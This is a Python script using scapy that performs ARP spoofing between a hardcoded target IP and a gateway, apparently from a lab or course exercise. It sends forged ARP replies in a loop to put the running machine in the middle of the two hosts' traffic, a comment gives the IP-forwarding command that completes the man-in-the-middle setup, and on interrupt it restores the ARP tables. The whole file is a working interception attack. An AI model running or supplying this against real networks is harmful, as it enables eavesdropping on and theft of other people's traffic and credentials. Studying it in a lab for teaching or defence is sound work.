#!/usr/bin/env pyhton

import scapy.all as scapy
import time
import sys

# To enable IP forwarding for becoming MiM: echo 1 > /proc/sys/net/ipv4/ip_forward

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # Create a ethernet frame with broadcast MAC address as destination
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    # Send and receive function
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # return MAC address of given IP
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    # send ARP response to the victim with fake source IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    # sends packet 4 times
    scapy.send(packet, count=4, verbose=False)


TARGET_IP = "192.168.64.135"
GATEWAY_IP = "192.168.64.2"

sent_packets_count = 0
try:
    while True:
        spoof(TARGET_IP, GATEWAY_IP)        # tells router I am the target
        spoof(GATEWAY_IP, TARGET_IP)        # tells target that I am the router (gateway)
        sent_packets_count = sent_packets_count + 2

        # comma used to print everything on the same line, \r always prints from start of line,
        # only on Python 2.7!!!
        # print("\r[+] Packets sent: " + str(sent_packets_count)),
        # sys.stdout.flush()

        # Python 3 compatible
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")

        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Resetting ARP tables...")
    restore(TARGET_IP, GATEWAY_IP)
    restore(GATEWAY_IP, TARGET_IP)
    print("[+] Successfully restored. Quitting...")
